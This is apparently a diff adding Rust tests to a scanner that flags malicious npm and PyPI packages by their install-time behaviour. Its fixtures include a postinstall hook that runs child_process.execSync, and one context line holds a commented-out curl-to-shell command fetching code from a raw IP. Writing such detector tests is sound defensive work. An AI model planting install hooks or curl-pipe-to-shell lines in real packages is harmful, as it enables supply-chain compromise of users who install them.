@@ -165,6 +165,30 @@ fn malicious_npm_install_chain_is_on_the_install_surface() {
 }
 
 #[test]
+fn inline_node_eval_requires_join_the_install_surface() {
+    let pj = r#"{"name": "inl", "version": "1.0.0",
+        "scripts": {"postinstall": "node -e \"try{require('./postinstall')}catch(e){}\""}}"#;
+    let bytes = tar_gz_files(&[
+        ("package/package.json", pj),
+        (
+            "package/postinstall.js",
+            "require('child_process').execSync('id');\n",
+        ),
+        ("package/index.js", "module.exports = 1;\n"),
+    ]);
+    let r = scan(&bytes, "inl-1.0.0.tgz");
+    assert_eq!(
+        r.install_surface,
+        vec![
+            "package.json:scripts.postinstall",
+            "postinstall.js",
+            "index.js"
+        ]
+    );
+    assert_eq!(r.features["inst_proc_exec"], 2.0);
+}
+
+#[test]
 fn comments_do_not_count_end_to_end() {
     let setup = "# import subprocess; subprocess.call('curl http://1.2.3.4 | sh')\n'''\nos.system is not called\n'''\nfrom setuptools import setup\nsetup(name='quiet')\n";
     let bytes = tar_gz_files(&[("quiet-1.0/setup.py", setup)]);
@@ -238,6 +262,38 @@ fn ecosystem_detection_by_content() {
     .unwrap();
     assert_eq!(r.ecosystem, Ecosystem::Npm);
     assert_full_key_set(&r);
+}
+
+#[test]
+fn wrapper_directories_are_stripped_to_the_package_root() {
+    // Sample collections often re-pack extracted packages under several directories.
+    let bytes = zip_files(&[
+        (
+            "tmp/tmpab12/demo/demo-1.0.0/PKG-INFO",
+            BENIGN_PKG_INFO.as_bytes(),
+        ),
+        (
+            "tmp/tmpab12/demo/demo-1.0.0/setup.py",
+            MALICIOUS_SETUP_PY.as_bytes(),
+        ),
+        ("tmp/tmpab12/demo/demo-1.0.0/demo/__init__.py", b""),
+    ]);
+    let r = scan(&bytes, "2024-01-01-demo-v1.0.0.zip");
+    assert_eq!(r.ecosystem, Ecosystem::Pypi);
+    assert_eq!(r.install_surface, vec!["setup.py", "demo/__init__.py"]);
+    assert!(r.features["inst_dyn_code"] >= 1.0);
+    assert_eq!(r.features["has_setup_py"], 1.0);
+
+    let npm = zip_files(&[
+        (
+            "tmp/x/evil/package/package.json",
+            MALICIOUS_PACKAGE_JSON.as_bytes(),
+        ),
+        ("tmp/x/evil/package/index.js", b"module.exports = 1;\n"),
+    ]);
+    let r = scan(&npm, "evil.zip");
+    assert_eq!(r.ecosystem, Ecosystem::Npm);
+    assert_eq!(r.features["n_npm_install_scripts"], 2.0);
 }
 
 #[test]
